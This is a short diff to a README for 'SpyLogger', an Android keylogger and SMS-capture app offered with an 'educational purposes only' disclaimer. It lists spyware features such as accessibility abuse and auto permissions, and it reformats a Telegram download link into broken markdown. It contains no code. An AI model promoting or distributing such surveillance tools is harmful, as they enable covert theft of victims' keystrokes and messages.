@@ -3,8 +3,6 @@ Android KeyLogger and SMS Capture (software is meant for educational)
 
 **Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
 
-## Free Version Screenshot
-![SpyLogger](Screenshots/GUI.png "SpyLogger in action")
 
 ## SpyLogger Free Version 
 
@@ -14,8 +12,8 @@ Android KeyLogger and SMS Capture (software is meant for educational)
 * Choose the Activity Main method when accessibility is Enabled (HTML File, WebView, OpenLink, Open Another App, Toast Message)
 * Auto Permissions
 * ~~AntiUninstall~~
-## [Download](t.me/irarechannel/67)
-
+## [Download][(
+https://t.me/irarechannel/67)
 ## Requisites
 * .NET Framework 4.8
 
